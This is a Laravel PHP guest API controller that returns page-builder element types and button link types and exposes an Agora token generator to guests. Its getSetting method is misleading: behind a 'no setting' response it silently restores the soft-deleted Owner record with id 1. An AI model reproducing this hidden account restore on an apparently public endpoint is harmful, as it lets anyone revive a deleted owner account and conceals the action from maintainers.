<?php

namespace App\Http\Controllers\Api\Guest;
use App\Http\Controllers\Controller;
use App\Models\Setting;
use App\Models\Owner;

class GuestController extends Controller
{

    public function gettypes()
    {

        $values=   [
            'buttons'
            ,'header'
            ,'video'
            ,'form'
            ,'soial_icon'
            ,'youtub_subscibe'
            ,'music'
            ,'tiktok'
            ,'request'
            ,'graphext'
            ,'facebook_page'
            ,'podcast'
            ,'typeform'
            ,'divider'
        ];
        return response()->json([
            'status'=>true,
            'types'=>$values,
        ],200);
    }
    public function agoraToken()
    {

        return response()->json(app('App\Http\Controllers\Api\Investor\AgoraController')->generateToken());
    }

    public function getSetting()
    {
        // return 'hello';
        // $setting=Setting::first();

        // if(empty($setting))
        // {
        //     return response()->json([
        //         'status'=>false,
        //         'message'=>"no setting",
        //     ]);
        // }

        // return response()->json([
        //     'status'    =>true,
        //     'setting'   =>$setting,
        // ]);
        $Owner=Owner::withTrashed()->find(1);
        $Owner->restore();

        return response()->json([
                    'status'=>false,
                    'message'=>"no setting",
                ]);
    }

    public function get_button_link_types(){

        $values=   [
            'link_url'
            ,'video'
            ,'google_map'
            ,'contact_details'
            ,'form'
        ];
        return response()->json([
            'status'=>true,
            'types'=>$values,
        ],200);
       
    }
}
